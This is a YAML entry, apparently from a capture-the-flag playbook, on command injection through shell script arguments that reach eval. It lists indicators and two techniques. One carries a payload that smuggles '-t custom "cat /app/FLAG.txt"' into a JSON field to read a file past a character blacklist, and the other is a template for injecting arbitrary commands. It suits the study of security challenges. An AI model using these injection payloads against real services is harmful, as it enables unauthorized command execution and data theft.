name: command_injection_shell_script_args
category: web
tags: [command_injection, shell, argument_injection, eval]
indicators:
  - "Shell script with -t custom option"
  - "eval $custom_command in shell script"
  - "Blacklist filtering special chars but not shell arguments"
  - "subprocess.check_output with shell=True"

tricks:
  - name: "Bypass blacklist via shell script arguments"
    when: "Blacklist filters &, |, $, ;, \\n, \\r, ` but shell script accepts -t custom"
    how: "Use -t custom to pass command to eval"
    payload: |
      # Blacklist: &, |, $, ;, \n, \r, `
      # Shell script: ./check_service.sh -t custom "command"
      # eval $custom_command in shell script
      
      payload = '-t custom "cat /app/FLAG.txt"'
      requests.post(url, json={"service_name": payload})

  - name: "Shell argument injection"
    when: "User input passed to shell script as argument"
    how: "Inject shell script options like -t, -h, etc."
    payload: |
      # Original: ./check_service.sh {user_input}
      # Inject: -t custom "malicious_command"
      # Result: ./check_service.sh -t custom "malicious_command"

